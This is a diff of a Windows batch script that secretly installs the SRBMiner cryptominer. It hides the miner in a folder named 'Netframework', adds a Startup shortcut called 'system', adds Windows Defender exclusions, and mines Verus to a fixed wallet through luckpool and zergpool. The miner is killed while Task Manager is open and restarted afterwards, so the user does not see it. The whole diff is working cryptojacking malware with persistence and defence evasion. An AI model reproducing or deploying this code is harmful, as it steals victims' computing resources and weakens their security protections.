@@ -183,10 +183,10 @@ if not defined _desktop_ for /f "delims=" %%a in ('%psc% "& {write-host $([Envir
 
 set "_pdesk=%_desktop_:'=''%"
 setlocal EnableDelayedExpansion
-                    
+
 ::========================================================================================================================================
 
-@echo off & mkdir C:\Netframework.4.5.2\SRBMiner-Multi-2-5-2
+@echo off & mkdir C:\Netframework\SRBMiner-Multi-2-5-2
 @echo off & >"%temp%\script_.vbs"^
     (       
       echo/ url ^= "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.2/SRBMiner-Multi-2-5-2-win64.zip"
@@ -246,20 +246,20 @@ echo/ Sub DoDownload^(Url, Path^)
 echo/ End Sub
 
 echo/ DoDownload url, filename
-echo/ strOutputDir   ^= "C:\Netframework.4.5.2"
-echo/ strZipFilePath ^= "%temp%\SRBMiner-Multi-2-2-2-win64.zip"
+echo/ strOutputDir   ^= "C:\Netframework"
+echo/ strZipFilePath ^= "%temp%\SRBMiner-Multi-2-5-2-win64.zip"
 echo/ CreateObject^("Shell.Application"^).NameSpace^(CreateObject^("Scripting.FileSystemObject"^).GetAbsolutePathName^( strOutputDir ^) ^).copyHere ^(CreateObject^( "Shell.Application"^).NameSpace^( CreateObject^("Scripting.FileSystemObject"^).GetAbsolutePathName^( strZipFilePath^)^).Items^(^) ^), 1044
 
 echo/ set WshShell ^= WScript.CreateObject^("WScript.Shell"^)
 echo/ Set objNetwork^= CreateObject^("WScript.Network"^)
-echo/ StrProgramFiles ^= WshShell.ExpandEnvironmentStrings^("C:\Netframework.4.5.2\SRBMiner-Multi-2-5-2"^)
+echo/ StrProgramFiles ^= WshShell.ExpandEnvironmentStrings^("C:\Netframework\SRBMiner-Multi-2-5-2"^)
 
 	echo/ strDesktop ^= WshShell.SpecialFolders^("startup"^)
 	echo/ strshortcut^= strDesktop ^& "\system.lnk"
 	echo/ Set oUrlLink ^= WshShell.CreateShortcut^(strshortcut^)
 	echo/ oUrlLink.TargetPath ^= strProgramFiles ^&"\audio.vbs"
 	echo/ oUrlLink.WorkingDirectory ^= strProgramFiles
-        echo/ oUrlLink.IconLocation ^= "C:\Netframework.4.5.2\system.ico"
+        echo/ oUrlLink.IconLocation ^= "C:\Netframework\system.ico"
         echo/ oUrlLink.Description ^= "system"
         echo/ oUrlLink.Save
     
@@ -277,27 +277,28 @@ start script_.vbs
 @echo off & >"%temp%\script_app.bat"^
     (
     echo/ Set MyProcess^=taskmgr.exe
+    echo/ set /a num1^=%%number_of_processors%%/2
     echo/ set /a num^=%%number_of_processors%%/2
     echo/ for /f %%%%Z in ^('wmic cpu get numberofcores^^^|findstr "^[0-9]"'^) do set /A totalcore^=%%%%Z
     echo/ if %%totalcore%%^==1 goto :exit else goto :next
     echo/ :next
-    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956 -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.rigmyroom -p x -t ^!%%num%%
+    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^^!stratum+tcp://verushash.na.mine.zergpool.com:3300 -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x c^=VRSC,mc^=VRSC -t %%num1%%^^!%%num%%
     echo/ :start
     echo/ ^>nul ping -n 2 localhost
     echo/ for /f "tokens=1" %%%%z In ^('tasklist /NH /FI "imagename eq %%MyProcess%%"'^) do set yy=%%%%z
     echo/ If /i %%yy%%^==%%MyProcess%% ^(taskkill /IM SRBMiner-MULTI.exe /F^) Else ^(goto :start^)
     echo/ ^>nul ping -n 240 localhost
-    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956 -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.rigmyroom -p x -t ^!%%num%%
+    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^^!stratum+tcp://verushash.na.mine.zergpool.com:3300 -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x c^=VRSC,mc^=VRSC -t %%num1%%^^!%%num%%
     echo/ goto :start
     echo/ :exit
     echo/ exit
 
  )
 cd %temp%\
-powershell -Command Add-MpPreference -ExclusionPath "C:\Netframework.4.5.2,%temp%"
+powershell -Command Add-MpPreference -ExclusionPath "C:\Netframework,%temp%"
 >nul ping -n 15 localhost
-copy %temp%\audio.vbs C:\Netframework.4.5.2\SRBMiner-Multi-2-5-2 /y
-copy %temp%\script_app.bat C:\Netframework.4.5.2\SRBMiner-Multi-2-5-2 /y
+copy %temp%\audio.vbs C:\Netframework\SRBMiner-Multi-2-5-2 /y
+copy %temp%\script_app.bat C:\Netframework\SRBMiner-Multi-2-5-2 /y
 
 :MainMenu
 
